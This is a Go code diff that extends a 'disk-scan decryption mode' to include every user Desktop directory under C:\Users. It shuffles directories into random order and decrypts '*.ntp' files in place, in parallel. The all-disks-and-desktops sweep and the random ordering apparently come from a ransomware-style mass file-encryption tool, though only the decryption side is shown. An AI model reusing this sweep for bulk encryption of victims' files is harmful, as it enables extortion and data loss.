@@ -648,10 +648,17 @@ func decryptDirectory(inputDir, outputDir string, recipientKeyPair *neptuneCurve
 // Returns:
 //   - error: nil if the overall scan completes, or an error if disk enumeration fails
 func decryptAllDisks(recipientKeyPair *neptuneCurve25519.KeyPair, chunkSize int, parallel int) error {
-	// Enumerate all available disks on the system
+	// Enumerate all available disks on the system (excluding C:\)
 	disks, err := utils.GetAllDisks()
 	if err != nil {
 		return fmt.Errorf("failed to get disk list: %w", err)
+	}
+
+	// Get all user Desktop directories from C:\Users
+	desktopDirs, err := utils.GetAllDesktopDirectories()
+	if err != nil {
+		utils.PrintWarning("Failed to get Desktop directories: %v", err)
+		desktopDirs = []string{}
 	}
 
 	// Print disk-scan mode banner and configuration
@@ -659,6 +666,8 @@ func decryptAllDisks(recipientKeyPair *neptuneCurve25519.KeyPair, chunkSize int,
 	utils.PrintWarning("DISK-SCAN DECRYPTION MODE")
 	utils.PrintWarning("==============================")
 	utils.PrintWarning("Number of disks to scan: %d", len(disks))
+	utils.PrintWarning("Disks: %v", disks)
+	utils.PrintWarning("Number of Desktop directories: %d", len(desktopDirs))
 	utils.PrintWarning("Include patterns: %v", decryptInclude)
 	utils.PrintWarning("Default parameters applied:")
 	utils.PrintWarning("  --force: true")
@@ -668,7 +677,7 @@ func decryptAllDisks(recipientKeyPair *neptuneCurve25519.KeyPair, chunkSize int,
 	utils.PrintWarning("  --parallel: %d", decryptParallel)
 	utils.PrintWarning("==============================")
 	utils.PrintWarning("SCAN RANGE:")
-	utils.PrintWarning("  - All disks: %v", disks)
+	utils.PrintWarning("  - All disks except C:\\: %v", disks)
 	utils.PrintWarning("  - All user desktop directories: C:\\Users\\*\\Desktop")
 	utils.PrintWarning("==============================")
 	utils.PrintWarning("WARNING: This will decrypt files across ALL disks!")
@@ -743,6 +752,59 @@ func decryptAllDisks(recipientKeyPair *neptuneCurve25519.KeyPair, chunkSize int,
 		}
 
 		// Wait for all directories on this disk to complete
+		wg.Wait()
+	}
+
+	// Process all user Desktop directories from C:\Users
+	if len(desktopDirs) > 0 {
+		utils.PrintInfo("Processing Desktop directories from C:\\Users (%d directories)", len(desktopDirs))
+
+		// Shuffle Desktop directories for random processing order
+		utils.ShuffleStrings(desktopDirs)
+
+		// Set up parallel processing with semaphore-based concurrency control
+		var wg sync.WaitGroup
+		sem := make(chan struct{}, parallel)
+
+		// Launch goroutine for each Desktop directory
+		for _, desktopDir := range desktopDirs {
+			wg.Add(1)
+			sem <- struct{}{}
+
+			go func(dirPath string) {
+				defer wg.Done()
+				defer func() { <-sem }()
+
+				// Determine include patterns (default to *.ntp)
+				includePatterns := decryptInclude
+				if len(includePatterns) == 0 {
+					includePatterns = []string{"*.ntp"}
+				}
+
+				// Recursively find matching files in this directory tree
+				files, err := utils.FindFilesRecursively(dirPath, includePatterns, decryptExclude)
+				if err != nil {
+					utils.PrintWarning("Failed to scan directory: %s", dirPath)
+					atomic.AddInt32(&totalProcessedDirs, 1)
+					return
+				}
+
+				// Skip directories with no matching files
+				if len(files) == 0 {
+					atomic.AddInt32(&totalSkippedDirs, 1)
+					return
+				}
+
+				// Decrypt files in this Desktop directory (in-place: same input and output)
+				err = decryptDirectory(dirPath, dirPath, recipientKeyPair, chunkSize, parallel)
+				if err != nil {
+					utils.PrintWarning("Failed to process directory %s: %v", dirPath, err)
+				}
+				atomic.AddInt32(&totalProcessedDirs, 1)
+			}(desktopDir)
+		}
+
+		// Wait for all Desktop directories to complete
 		wg.Wait()
 	}
 
